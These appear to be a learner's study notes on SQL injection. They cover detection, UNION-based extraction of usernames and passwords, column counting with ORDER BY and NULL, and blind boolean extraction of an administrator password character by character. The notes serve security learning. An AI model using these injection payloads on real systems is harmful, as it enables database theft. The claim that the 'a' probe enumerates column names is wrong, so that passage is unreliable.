### Introduction
SQLI in an input that allows the attacker to send queries to the database. The risk are several like **generate data breach** or even alter the database.
Detection of sqli could be with the following steps
- The single quote character `'` and look for errors or other anomalies.
- Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.
- Boolean conditions such as `OR 1=1` and `OR 1=2`, and look for differences in the application's responses.
- Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
- OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.
### Confirming
We could detect if there's any issue unsanitized because a single quote cause an error, but you could check a wordlist to this too.
Here some example [[lab-login-bypass]], [[lab-retrieve-hidden-data]]

### How much column are there
IMagine you got the following query retrieving data from the DB
```url
SELECT name, description FROM products WHERE category = 'Gifts'
```
Now if we want to use the db to retrieve all the data from a column
```sql
' UNION SELECT username, password FROM users--
```
So we are closing the `'gift'` and retrieving the data using UNION, this keyword enables to append the results to the original query. For example:

`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

So to carry out this query ensure to answer this two questions:
1. How many columns are being returned from the original query.
2. Which columns returned from the original query are of a suitable data type to hold the results from the injected query.

To know how much columns there are you could uses the `ORDER BY` query (it doesn't really matters whether it is in uppercase or lowercase because SQL language is case-insensitive).
```SQL
' ORDER BY 1-- 
' ORDER BY 2-- 
' ORDER BY 3--
```
THis is usefule to determine the number of columns, because this no needs you ton know the name of the columns, and if you exceed the number of columns it retrieves an error such as:
`The ORDER BY position number 3 is out of range of the number of items in the select list.`
or not necessarily an error but some difference in the response for sure.
And the second method involves to use `UNION SELCT` 
```SQL
' UNION SELECT NULL-- 
' UNION SELECT NULL,NULL-- 
' UNION SELECT NULL,NULL,NULL--
```
If the number of nulls mismatch the numbers of columns, the sams as before, it will retrive some kind on anomalous

[[lab-determine-number-of-columns]]
#### The sintax may vary assuming the different SQL tecnology
https://portswigger.net/web-security/sql-injection/cheat-sheet

### What's the column name
To guess the name of the column we will use the samne union select query with the null, but we should go specifying the name of the column, so if something goes wrong it throws an error or something, if it is correct it desplay correctly, so
```sql
' UNION SELECT 'a',NULL,NULL,NULL-- 
' UNION SELECT NULL,'a',NULL,NULL-- 
' UNION SELECT NULL,NULL,'a',NULL-- 
' UNION SELECT NULL,NULL,NULL,'a'--
```
if the column start with the letter a it display, in the other case it throws an error, this way we could enumerate the column names

[[]]

## Blind SQL
### What is is?
Blind SQL occurs whne the application is vulnerable to SQLI but in the response you can see anything from de data base, that's why UNION attack will fail, because that's used to see how many columns there are. 
##### Example
**For example** an application that uses a cookie to determine if you're a known user, so this application uses the following query `SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`, that's is not reflecting in any kind of data, but when you submit a recognized `TrackingId`, the query returns data and you receive a "Welcome back" message in the response, this behavior is what we refer with **blind sql**, we could submit an `…xyz' AND '1'='1` and it returns *welcome back* because the condition is true, so on `…xyz' AND '1'='2` don't retrieve any because the condition is false, thereby you could use it to retrieve data: `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm` This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than `m`.
Next, we send the following input:

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`

This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than `t`. And eventually continue the process to determine the username-password